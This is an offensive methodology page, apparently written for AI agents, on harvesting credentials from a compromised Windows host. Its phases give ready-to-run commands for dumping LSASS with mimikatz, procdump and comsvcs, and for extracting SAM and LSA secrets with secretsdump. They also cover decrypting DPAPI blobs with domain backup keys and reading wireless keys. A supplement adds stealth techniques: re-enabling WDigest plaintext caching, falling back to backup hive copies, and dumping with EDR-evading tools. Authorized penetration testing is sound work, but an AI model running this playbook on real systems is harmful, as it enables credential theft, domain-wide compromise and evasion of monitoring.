---
technology: "Windows secret stores (LSASS, SAM/SECURITY hives, LSA secrets, DPAPI)"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
provenance: "evidence-grounded (16 files; chains quoted from across the evidence base) + upstream: Microsoft Learn (credentials-protection-and-management incl. RunAsPPL; DPAPI CryptProtectData; 'DPAPI backup keys on AD domain controllers'; netsh wlan; autologon registry KB), gentilkiwi mimikatz wiki, Impacket secretsdump/dpapi docs. Commands sanitized where needed. Verified 2026-11-12. Supplement 2026-11-13: source: six2dez/pentest-book (post-exploitation/windows/README.md, no license — rewritten with attribution), accessed 2026-11-13; adds fallback hive locations, WDigest gate, registry-secret extras, lsassy/Dumpert tooling (WDigest registry key per Microsoft's WDigest documentation)."
---

# Windows secret stores — bug bounty methodology

Target model: a Windows host where you hold a shell (user or SYSTEM, local or
remote) and want every credential the host itself can recover. Companion
overview: [[windows-secrets|Windows secret stores]]. Domain-controller-only
attack paths (NTDS.DIT extraction, DCSync) live in the [[ntds]] unit — here we
work the local stores; DCSync via mimikatz appears only where observed chains
used it as the credential-recovery step.

## Triage table

| Store | Needs | Tool workflow (prose below) | Payoff |
|---|---|---|---|
| LSASS memory | local admin, non-protected process | dump then parse (live or offline) | cleartext pw, NTLM, Kerberos, DPAPI keys |
| SAM + SYSTEM hives | local admin | `reg save` + secretsdump LOCAL | local account NT hashes |
| LSA secrets (SECURITY hive) | local admin | secretsdump / mimikatz `lsadump::secrets` | service pwds, AutoLogon cleartext, machine acct |
| DPAPI blobs | user context (or admin) + a key | mimikatz `dpapi::*` / impacket-dpapi | browser/saved-app passwords |
| Registry AutoLogon | any read of HKLM | winPEAS/Seatbelt or direct registry read | cleartext domain password |
| Wireless profiles | local admin (sometimes user) | `netsh wlan show profile key=clear` | WiFi PSKs (lateral into other sites) |

Order of operations on a fresh admin shell: LSASS (best quality) → hives
(guaranteed) → DPAPI (needs a key you often just got from LSASS).

## Phase 1 — LSASS: dump, then parse

**Acquisition** (pick by tooling present; all produce a parseable minidump):

- Task Manager → lsass.exe → "Create dump file" (GUI-only path).
- `procdump -ma lsass lsass.dmp` (Sysinternals; accepts the EULA with `-accepteula`).
- `rundll32 C:\windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full`
  — no binary drop, a favorite one-liner shape.
- mimikatz directly on the live box (see below) skips the file entirely.

Get the PID first (`tasklist /fi "imagename eq lsass.exe"`).

**Parsing off-host** — the observed chain, verbatim shape: the operator pulls
`lsass.zip` from a forensic share, then:

```bash
pip3 install pypykatz
pypykatz lsa minidump lsass.DMP
# prints per-logon-session: usernames, NT hashes, cleartext (where reversible
# encryption is on), Kerberos keys/TGTs, and DPAPI master keys
```

**Live with mimikatz** (needs SeDebugPrivilege — hence the standard opening
`privilege::debug`):

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    ; all logon sessions in LSASS memory
mimikatz # sekurlsa::ekeys             ; Kerberos keys (→ pass-the-key / overpass-the-hash)
mimikatz # sekurlsa::dpapi             ; DPAPI master keys held in memory
```

**Defender-side facts** (upstream): on Windows 8.1+ with LSA protection
(`RunAsPPL`), non-protected processes get access denied on LSASS — a mimikatz
run returning `0x00000005` is the fingerprint. Options then:Credential Guard
aside, hive/LSA-secrets extraction still works, a driver-signed attack or
`mimidrv` exists but is loud, and an LSASS dump taken by *the system itself*
(forensic share, crash dump) parses fine offline. Check first:
`(Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa).RunAsPPL`.

Note what LSASS cannot give you: sessions that ended, credentials that only
touched the box before the last reboot, and hash-only (non-reversible) logons
beyond the NT hash itself.

## Phase 2 — SAM/SYSTEM/SECURITY hives

```powershell
# on-target, from any admin shell (observed form):
reg save HKLM\sam sam.bak
reg save HKLM\system system.bak
reg save HKLM\security security.bak
# exfil the three files, then off-host:
```

```bash
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
# LOCAL (uppercase) is the flag that means "these are files, not a target host"
```

Remote equivalent when you hold admin SMB and do not want to stage files:

```bash
impacket-secretsdump 'DOMAIN/user:pass@198.51.100.20'
# authenticates over SMB/DCE, pulls SAM + LSA secrets (+ NTDS if it can, see ntds unit)
```

Output to triage, in value order: `[*] DefaultPassword` (Phase 3 — plaintext),
service account lines `SCCM/acct$: aes256...`, machine account hash, then the
local `:500:`/`:1000:`+ NT hashes (crack or pass-the-hash — see the ntlm unit).

Decryptor note (why SYSTEM travels with SAM): the SAM is encrypted with the
LSA secret `SAMKey`/boot key scrambled across the SYSTEM hive; tools re-derive
it, so a SAM file alone is inert. Always grab both.

## Phase 3 — LSA secrets and AutoLogon

LSA secrets live in the SECURITY hive; you already have them if Phase 2 ran —
look for the `[*] DefaultPassword` block. What it is: the registry's Winlogon
AutoLogon entry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
`AutoAdminLogon=1`, `DefaultDomainName`, `DefaultUserName`, `DefaultPassword`)
stores the password **in cleartext** because winlogon.exe must type it at boot
— Microsoft's own autologon documentation warns of exactly this. Machines
configured for kiosk/service-console auto-sign-in hand you a domain password.

Enumeration-first variant (observed — winPEAS finds it from a user shell):

```text
[+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultPassword : <cleartext>
```

Live mimikatz equivalent: `lsadump::secrets` (needs the same admin + debug).
One observed engagement frames the finding well: the autologon account's profile
existing on a *second* host tells you the credential works there too.

## Phase 4 — DPAPI: blob hunting and key derivation

Files (per-user under `%APPDATA%`, per-machine under `C:\ProgramData`):

```
%APPDATA%\Microsoft\Credentials\<GUID>          credential blobs (RDP/credman shape)
%APPDATA%\Microsoft\Protect\<SID>\<GUID>        user master keys
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys machine-key material
%LOCALAPPDATA%\Microsoft\Edge|Chrome\...\Login Data   browser store (SQLite)
```

**Live, with mimikatz** — the observed chains, verbatim module usage:

```
; unlock cached master keys with the user's password or NT hash:
mimikatz # dpapi::masterkey /in:%APPDATA%\Microsoft\Protect\<SID>\<guid> /sid:<SID> /password:<pw>
; then decrypt a credential blob with the unlocked key context:
mimikatz # dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290 /sid:S-1-5-21-...-1001
; private-key flavor (observed): machine RSA key material
mimikatz # dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-..."
; saved browser logins (observed): Chrome/Edge user-data path, works for Edge too
mimikatz # dpapi::chrome /in:c:\Users\bob.wood\appdata\local\microsoft\edge\userda~1\Default
```

In practice `sekurlsa::dpapi` (Phase 1) first — master keys already in LSASS
make `/password` unnecessary.

**Offline, with Impacket** — the observed chain:

```bash
# 1) unlock the master key with the user's SID + password (or -key with a raw key):
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
    -sid S-1-5-21-... -password 'UserPw'
#    -> prints/derives the master key material
# 2) decrypt the credential blob with that key:
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <derived-key>
```

**The domain skeleton key to everything** (upstream, Microsoft): each domain's
DPAPI *backup keys* are generated once at domain creation and held by the DCs;
as Domain Admin, `mimikatz # lsadump::backupkeys /system:<dc> /export` dumps
them, and `dpapi::masterkey /in:... /pvk:domain_backup.pvk` then unlocks **any
user's** master keys — every DPAPI blob in the domain follows. This is the
designed recovery path; treat DA on any host as domain-wide DPAPI compromise.

## Phase 5 — Wireless profiles

Upstream-documented (no observed chain; Microsoft's `netsh wlan` reference):

```powershell
netsh wlan show profiles
netsh wlan show profile name="CorpWiFi" key=clear
# "Key Content" line = the PSK, in clear, for any profile on the machine
```

Needs admin on most builds. Value on engagement: SSID+PSK reuse across sites
and guest networks, and WPA-Enterprise profiles leak the auth server name.

## Quick reference

```
privilege::debug + sekurlsa::logonpasswords        ; live LSASS
procdump/comsvcs MiniDump -> pypykatz lsa minidump ; offline LSASS
reg save HKLM\sam|system|security -> impacket-secretsdump ... LOCAL
impacket-secretsdump 'user@host'                   ; remote hives+secrets
lsadump::secrets / winPEAS                          ; AutoLogon DefaultPassword
dpapi::cred|capi|chrome /in:... /sid:... (or /pvk: domain backup)
impacket-dpapi masterkey|credential -file ...       ; offline DPAPI
netsh wlan show profile key=clear                   ; wireless PSKs
```

## Tool mapping (prose)

Mimikatz (gentilkiwi) is the live Swiss army knife — sekurlsa for LSASS,
lsadump for SAM/LSA secrets and domain backup keys, dpapi for every blob
flavor; Invoke-Mimikatz is its in-memory PowerShell packaging. Pypykatz
re-parses LSASS minidumps off-platform. Sysinternals procdump and the
comsvcs.dll MiniDump rundll32 one-liner acquire the dumps; Task Manager's
"Create dump file" needs no tooling at all. Impacket's secretsdump handles
hive triage both local-file (`LOCAL`) and remote, and Impacket's dpapi module
unlocks master keys and blobs offline. winPEAS and Seatbelt surface the
AutoLogon registry entry from low-privilege contexts; Evil-WinRM's shell is
the usual delivery vehicle for `reg save` on Windows targets; netsh (native)
reads wireless profiles. Crack/pivot output feeds hashcat (NT hashes) and the
pass-the-hash techniques covered in the [[ntlm]] unit.

## Supplement (2026-11-13) — deltas from six2dez/pentest-book

Rewritten from six2dez/pentest-book (`post-exploitation/windows/README.md`, no license — rewritten with attribution), accessed 2026-11-13. Diff-first: LSASS dump/parse, hive `reg save`, LSA secrets, AutoLogon, DPAPI (incl. domain backup keys) and wireless were already the body of this page — the deltas below.

**S1. Hive fallback locations when `reg save` is blocked or watched.** The locked-live hives have stale copies scattered on disk that need no registry API at all: `C:\Windows\repair\SAM` (and `SYSTEM`/`SECURITY`/`software` beside it), `C:\Windows\System32\config\RegBack\*` (the registry's own backup dir), and the `*.sav` files in `C:\Windows\system32\config\` — any pair (hive + SYSTEM of roughly matching vintage) feeds Phase 2's offline secretsdump. Older is often good enough for local accounts that never rotate.

**S2. WDigest — the cleartext gate you can reopen.** On Windows 8.1+/Server 2012 R2+ WDigest no longer stores plaintext in LSASS by default; with admin, setting `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential` (DWORD) to `1` restores plaintext caching for every FUTURE logon on the box — set it, wait for a real user/service logon, dump again (mimikatz `sekurlsa::wdigest` reads them). Equally useful read-only: a box where that value is already `1` is a host where someone enabled legacy behavior (or a prior attacker did — itself reportable).

**S3. Small registry stores the triage table missed.** VNC installs keep their connection password in the registry (`HKCU\Software\ORL\WinVNC3\Password` for the classic WinVNC line — a reversible encoding, not a hash); PuTTY's `HKCU\Software\SimonTatham\PuTTY\Sessions` tree stores per-session config including proxy credentials where deployments used them; SNMP parameters live under `HKLM\SYSTEM\CurrentControlSet\Services\SNMP` (community strings in some agents). One `reg query HKCU /f password /t REG_SZ /s` and the HKLM twin is the generic net that catches all three plus Phase 3's AutoLogon.

**S4. Acquisition tool deltas.** lsassy (hackndo) parses LSASS dumps AND pulls them remotely over SMB in one command (`lsassy example.com/user:'Password123!'@198.51.100.20`) — the remote-hive equivalent for LSASS, natural pairing with secretsdump. Dumpert (Outflank) dumps LSASS via direct syscalls, skipping the standard minidump APIs endpoint security hooks. Both belong on the acquisition list next to procdump/comsvcs when the target has telemetry on the classic paths.
